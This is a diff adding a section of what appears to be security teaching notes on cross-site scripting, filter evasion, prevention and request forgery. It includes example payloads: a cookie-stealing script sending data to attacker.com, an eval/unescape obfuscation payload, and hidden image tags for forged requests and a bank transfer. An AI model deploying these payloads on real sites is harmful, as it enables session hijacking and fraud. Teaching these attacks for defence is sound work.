@@ -1,0 +1,107 @@
+\section{Cross-Site Scripting}
+Injection attacks are generally considered server-side attacks, aiming to compromise the web server to steal data or execute malicious code within its environment. When it's not possible to compromise the application server-side, attackers may shift their focus to targeting other users of the application.
+
+\subsection{XSS}
+Cross-Site Scripting (XSS) describes a class of attack techniques where an attacker injects a malicious script into a trusted website. When a user visits the compromised page, their web browser executes this script. The attack exploits a vulnerability in the web application itself, often related to how it handles user-supplied data, rather than directly compromising the server's operating system. There are three major classifications of XSS: Reflected, Stored, and DOM-based.
+
+\paragraph{Reflected XSS.} Reflected XSS is a non-persistent attack where the malicious script is "reflected" off the web server and executed in the victim's browser. The primary goal is often to steal the user's session, typically by capturing their session cookie. How it works:
+
+\begin{enumerate}
+    \item \textit{Vulnerability}: A web application might be vulnerable if it includes user-supplied input directly in the HTTP response without proper sanitization. Imagine a search function that displays the search term back to the user on the results page.
+    \item \textit{Attacker's Payload}: The attacker crafts a URL containing a malicious script as part of a parameter. For example: \NewTexttt{http://example.com/search?q=<script>alert(1)</script>}.
+    \item \textit{Luring the Victim}: The attacker then sends this specially crafted URL to a victim, perhaps via email, a malicious link on another website, or a chat message.
+    \item \textit{Reflection and Execution}: When the victim clicks the link, their browser sends a request to \NewTexttt{example.com}. The vulnerable web application takes the \NewTexttt{q} parameter's value and reflects it directly back into the HTML of the search results page. The victim's browser receives the page and, seeing valid JavaScript within \NewTexttt{<script>} tags, executes it.
+\end{enumerate}
+
+The \NewTexttt{alert(1)} example demonstrates script execution, but a more impactful attack involves stealing the victim's session cookie.
+
+\begin{enumerate}
+    \item \textit{Attacker's Payload}: The attacker crafts a URL like: \texttt{http://example.com/search?q uery=<script>document.location='http://attacker.com/steal?cookie='+document \\.cookie</script>}
+    \item \textit{Luring and Execution}:
+
+          \begin{itemize}
+              \item The victim clicks this link.
+              \item The vulnerable application reflects the script into the page.
+              \item The victim's browser executes this script.
+              \item \NewTexttt{document.cookie} accesses the victim's session cookie for \NewTexttt{example.com}.
+              \item \NewTexttt{document.location='http://attacker.com/steal?cookie='+...} redirects the victim's browser to the attacker's server, appending the stolen cookie to the URL as parameter.
+          \end{itemize}
+
+    \item \textit{Session Hijacking}: The attacker's web page (\NewTexttt{attacker.com}) receives the request containing the victim's cookie. With this cookie, the attacker can then use it to impersonate the victim and hijack their session on \NewTexttt{example.com} without needing their username or password. This allows the attacker to access the victim's account and perform actions as them.
+\end{enumerate}
+
+\paragraph{Stored XSS.} In a Stored XSS attack, the objective is to persistently inject a malicious script into a web application's data storage, so that it's delivered to and executed by multiple users over time. This type of attack is particularly potent in applications that allow user interaction and publicly display the input, such as comment sections, user profiles, forums, or review pages. The attack typically unfolds as follows:
+
+\begin{enumerate}
+    \item \textit{Injection}: The attacker submits a comment, post, or other input containing a malicious script.
+    \item \textit{Storage}: The vulnerable web application stores this input without proper sanitization in its persistent data store.
+    \item \textit{Delivery}: A victim user logs in and navigates to the compromised page (e.g., the comment thread).
+    \item \textit{Execution}: The server responds by retrieving the attacker's script from the database and including it directly in the HTML sent to the victim's browser.
+    \item \textit{Compromise}: The script executes in the victim's browser, enabling the attacker to steal the victim's session token or perform other malicious actions, ultimately allowing the attacker to hijack the user's session.
+\end{enumerate}
+
+\paragraph{DOM-based XSS.} DOM-based XSS (Document Object Model-based XSS) is unique because the vulnerability and execution occur entirely on the client-side. The script is executed when the client-side code dynamically processes user-supplied data in an unsafe manner, often manipulating the structure and content of the page (the DOM). The server is typically not involved in processing the malicious payload. This attack exploits the fact that the page's visualization and behavior are often generated or modified by client-side JavaScript code. The attack steps often look like this:
+
+\begin{enumerate}
+    \item \textit{Luring}: The attacker feeds a crafted URL to the user. The malicious payload is usually contained within the URL fragment or a query string.
+    \item \textit{Request}: The user requests the URL from the server.
+    \item \textit{Response}: The server responds with a page containing legitimate client-side JavaScript code that is designed to read data from the URL to dynamically update a part of the page.
+    \item \textit{Vulnerability Triggered}: The client-side JavaScript processes the attacker's URL parameter unsafely, inserting the malicious payload into the DOM.
+    \item \textit{Execution}: The attacker's script is executed by the browser due to the client-side processing, enabling the theft of the user's session token or other client-side actions.
+    \item \textit{Hijacking}: The victim's browser sends the session token to the attacker, allowing the attacker to hijack the user's session.
+\end{enumerate}
+
+\subsection{Anti-XSS Filters and Evasion}
+Web applications and browsers often implement Anti-XSS filters designed to prevent the execution of malicious scripts. These filters operate by sanitizing or blocking dangerous input. Typical filtering actions include:
+
+\begin{itemize}
+    \item \textit{Sanitization}: Replacing sensitive tags like \NewTexttt{<script>} with harmless text (e.g., changing it to \NewTexttt{\&lt;script\&gt;}).
+    \item \textit{Removal/Replacement}: Eliminating or replacing characters critical to script execution, such as angle brackets, quotation marks, or event handlers (\NewTexttt{onload}, \NewTexttt{onerror}).
+\end{itemize}
+
+\paragraph{Evasion and Obfuscation.} When faced with filters, the attacker's primary strategy is to test numerous payloads until a variant is discovered that bypasses the specific security controls. This process of creating hard-to-detect malicious payloads is broadly known as obfuscation. JavaScript is particularly susceptible to obfuscation due to its flexible, dynamic nature. Obfuscation techniques use built-in JavaScript functions to hide the true nature of the code until it is executed by the browser, effectively hiding the script from the static filters. Three common obfuscation methods are:
+
+\begin{itemize}
+    \item \NewTexttt{eval()}: This function is highly dangerous as it dynamically interprets a string as executable code. An attacker can hide their malicious payload within a complex, non-obvious string that only \NewTexttt{eval()} can resolve and execute.
+    \item \NewTexttt{unescape()} / \NewTexttt{decodeURI()} / \NewTexttt{decodeURIComponent()}: These functions are used to replace hexadecimal, octal, or URL-encoded characters with their original equivalents. This allows the attacker to encode the entire payload, so it appears harmless to a filter, and then rely on the victim's browser to decode and execute it.
+    \item \NewTexttt{String.prototype.replace()}: This can be used repeatedly to substitute benign or fragmented strings into dangerous keywords. For example, replacing a variable placeholder with the word "script" right before execution.
+\end{itemize}
+
+An attacker might want to inject \NewTexttt{<script>alert(1)</script>}. To bypass a filter blocking the word "script", they can use encoding and \NewTexttt{eval()}.
+
+The encoded payload is \NewTexttt{eval(unescape(\%3C\%73\%63\ldots\%70\%74\%3E'))}. This filter sees a string of seemingly random characters. When executed by the browser, \NewTexttt{unescape()} converts the string back into the original dangerous JavaScript code. \NewTexttt{eval()} then executes the resulting string, triggering the alert.
+
+\subsection{Preventing Cross-Site Scripting}
+Effective protection against XSS requires a layered approach across the application lifecycle. There are three primary levels of prevention:
+
+\begin{enumerate}
+    \item \textit{Input Validation}: This occurs when data is initially received by the server. It involves ensuring that the data is the correct type and length. While often useful for general security, relying solely on input validation for XSS is risky, as determined attackers can often find ways around filters. Key methods include:
+
+          \begin{itemize}
+              \item Length Checks: Ensuring data is not excessively long.
+              \item Sanitization: Removing or filtering potentially malicious code fragments (though this is better handled by encoding at the output stage).
+              \item Regular Expressions: Checking the format of the input against expected patterns (e.g., ensuring a username only contains letters and numbers).
+          \end{itemize}
+
+    \item \textit{Output Encoding}: This is the most crucial defense. It involves treating user-supplied data as data, not executable code, before rendering it on the page. Using HTML encoding ensures that dangerous characters are replaced with their harmless entity equivalents.
+    \item \textit{Avoiding Dangerous Insertion Points}: Applications should never insert user-supplied input directly into an already existing sensitive context, such as within a \NewTexttt{<script>} block, an event handler (\NewTexttt{onload}), or an \NewTexttt{href} attribute without strict and specific context-aware encoding. This is particularly relevant for DOM-based XSS, where client-side code must be structured to only treat input as data.
+\end{enumerate}
+
+\paragraph{Request Forgery Attacks.} Request forgery attacks leverage the victim's authenticated session to trick them into executing unauthorized actions.
+
+\emph{On-Site Request Forgery} (OSRF) involves a malicious action initiated from a script or link on the same vulnerable website. The core idea is that the attacker finds a vulnerability on the web application itself that allows them to trick an authenticated user into generating an unexpected request. Because the request originates from the same site, all the necessary cookies and session tokens are automatically included. Suppose a vulnerable application (\NewTexttt{example.com}) allows a profile picture change via a simple GET request: \texttt{http://example.com/profile/change\_pic?url=user \_uploaded\_pic.jpg}. An attacker finds that this URL can be embedded in an image tag on a comment section on the same site:
+
+\begin{itemize}
+    \item \textit{Attacker's Payload (in a comment)}: \texttt{<img src="http://example.com/profile/change \_pic?url=http://attacker.com/malware.jpg" width="0" height="0">}
+    \item \textit{Execution}: When an authenticated victim (who is already logged into \NewTexttt{example.com}) views the malicious comment, their browser automatically attempts to load the invisible image. This hidden request hits the server as: \texttt{GET /profile/change\_pic?url=http://attacker .com/malware.jpg}.
+    \item \textit{Result}: The application, believing the request is legitimate because it came from an authenticated user on its own domain, changes the victim's profile picture to one controlled by the attacker.
+\end{itemize}
+
+\emph{Cross-Site Request Forgery} (CSRF) is a more common and classic attack where an attacker tricks a victim into sending a legitimate request to a vulnerable web application from a different, external domain. The concept is similar to OSRF, but the source of the malicious request is an attacker-controlled page, not the vulnerable site itself. Suppose a banking application, \NewTexttt{bank.com}, allows money transfer via a simple GET request: \texttt{https://bank.com/transfer?account=attacker \_account\&amount=1000}:
+
+\begin{enumerate}
+    \item \textit{Attacker Action}: The attacker creates a fake webpage \NewTexttt{attacker.com/malicious.html} containing an invisible element that targets the bank's action URL: \texttt{<img src="https://bank .com/transfer?account=attacker\_account\&amount=1000" width="0" height="0">}.
+    \item \textit{Luring the Victim}: The attacker sends the link to this malicious page to the victim.
+    \item \textit{Execution}: The victim, who is logged into \NewTexttt{bank.com} in another tab, visits the malicious website. The victim's browser attempts to load the invisible image, sending a request to \NewTexttt{bank.com}. Crucially, because the victim is logged in, their browser automatically includes the session cookie with the request.
+    \item \textit{Result}: \NewTexttt{bank.com} receives what appears to be a legitimate, authenticated request from the user and executes the transfer of \$1000 to the attacker's account.
+\end{enumerate}
